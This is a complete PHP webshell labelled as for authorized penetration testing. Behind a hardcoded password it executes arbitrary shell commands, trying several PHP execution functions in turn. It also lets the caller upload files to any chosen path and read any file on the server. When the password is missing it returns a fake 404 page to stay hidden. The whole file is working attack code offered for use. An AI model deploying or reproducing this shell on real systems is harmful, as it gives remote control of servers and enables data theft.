<?php
// ===================================================
// PHP Webshell - For authorized penetration testing only
// ===================================================

$auth = 'pentest123';

if (isset($_REQUEST['auth']) && $_REQUEST['auth'] === $auth) {
    $cmd = $_REQUEST['cmd'] ?? '';
    if ($cmd !== '') {
        echo "<pre>";
        // Try multiple execution functions
        if (function_exists('system'))        { system($cmd); }
        elseif (function_exists('passthru'))  { passthru($cmd); }
        elseif (function_exists('exec'))      { exec($cmd, $out); echo implode("\n", $out); }
        elseif (function_exists('shell_exec')){ echo shell_exec($cmd); }
        elseif (function_exists('popen'))     { $fp = popen($cmd, 'r'); while (!feof($fp)) echo fgets($fp); pclose($fp); }
        echo "</pre>";
    }

    // File upload
    if (isset($_FILES['file'])) {
        $dest = $_REQUEST['path'] ?? './' . $_FILES['file']['name'];
        move_uploaded_file($_FILES['file']['tmp_name'], $dest);
        echo "Uploaded: $dest";
    }

    // File read
    if (isset($_REQUEST['read'])) {
        echo "<pre>" . htmlspecialchars(file_get_contents($_REQUEST['read'])) . "</pre>";
    }
} else {
    http_response_code(404);
    echo "Not Found";
}
?>
